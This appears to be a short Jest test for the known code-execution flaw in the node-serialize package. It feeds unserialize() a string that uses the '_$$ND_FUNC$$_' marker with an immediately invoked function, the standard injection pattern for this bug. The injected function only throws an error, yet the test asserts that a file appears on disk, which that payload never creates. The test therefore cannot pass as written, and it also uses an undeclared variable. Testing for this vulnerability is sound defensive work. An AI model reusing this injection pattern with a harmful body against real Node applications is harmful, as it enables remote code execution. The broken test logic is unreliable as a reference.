test("Arbitrary code execution in node-serialize", () => {
  expect.assertions(2);
  const fs = require("fs");
  const serialize = require("node-serialize");
  const path = "./node-serialize";
  let payload =
    '{"rce":"_$$ND_FUNC$$_function (){throw new Error();}()"}';
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    serialize.unserialize(payload);
  } catch (error) {
    console.log("Start Error")
    console.log(error)
    console.log("End Error");
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
